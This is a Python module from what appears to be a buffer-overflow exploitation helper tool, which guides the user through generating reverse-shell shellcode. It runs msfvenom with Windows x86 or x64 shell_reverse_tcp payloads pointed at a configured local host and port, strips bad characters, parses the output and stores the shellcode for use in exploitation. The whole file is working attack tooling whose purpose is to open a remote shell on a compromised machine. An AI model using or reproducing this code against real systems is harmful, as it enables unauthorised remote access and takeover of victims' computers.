import subprocess

from BunnyBanners import BunnyBanners
from BunnyConfig import BunnyConfig
from termcolor import colored

from BunnyValidator import BunnyValidator


class BunnyPayload:

    @staticmethod
    def GeneratePayload():
        BunnyBanners.PrintPayloadBanner()

        print(colored("Now that we have our bad characters, we can generate some shellcode that will give us a "
                      "reverse shell upon successful exploitation. Answer the following to generate the "
                      "payload...\n\n", "green"))

        print(colored("Payload:\n\t1: x86\n\t2: x64\n", 'cyan'))

        payload = input(colored("Choose 1 or 2: ", "yellow"))

        payloadBit = 'x86'
        payloadStr = 'windows/shell_reverse_tcp'

        while True:
            if payload == '1' or payload == 'x86':
                break
            elif payload == '2' or payload == 'x64':
                payloadBit = 'x64'
                payloadStr = 'windows/x64/shell_reverse_tcp'
                break
            else:
                print(colored(payload + " is not a valid option", "red"))
                payload = input(colored("\n\nPlease choose 1 or 2: ", 'yellow'))

        args = ["msfvenom",
                "-p",
                payloadStr,
                "LHOST=" + BunnyConfig.local_ip,
                "LPORT=" + str(BunnyConfig.local_port),
                "EXITFUNC=thread",
                "-f",
                "c",
                "-a", payloadBit,
                "-b", "\"" + BunnyConfig.badChars.replace(" ", "").replace("\n", "") + "\""]

        proc = subprocess.Popen(args, stdout=subprocess.PIPE)

        print(colored("\n\nrunning msfvenom -p " + payloadStr + " LHOST=" + BunnyConfig.local_ip + " LPORT=" + str(BunnyConfig.local_port) + " EXITFUNC=thread -f c -a " + payloadBit + " -b " + "\"" + BunnyConfig.badChars + "\"\n\n", "green"))

        temp_shellcode = ""

        while True:
            line = proc.stdout.readline()
            # print(line)
            if not line:
                if not temp_shellcode or temp_shellcode == "":
                    input(colored("Error generating shellcode"))
                    return False
                break;
            else:
                if not b"unsigned char buf[]" in line:
                    temp_shellcode += str(line).replace("b'\"", "").replace("\\\\", "\\").replace("\\n'", "").replace("\"", "").replace(";", "")

        if BunnyValidator.IsValidShellcode(temp_shellcode):
            BunnyConfig.shellcode = bytes(temp_shellcode, "utf-8")

        print(colored("The following is the generated shellcode. This will be saved to the configuration file.\n\n" + temp_shellcode))
        input(colored("Press enter to continue", "yellow"))

        return True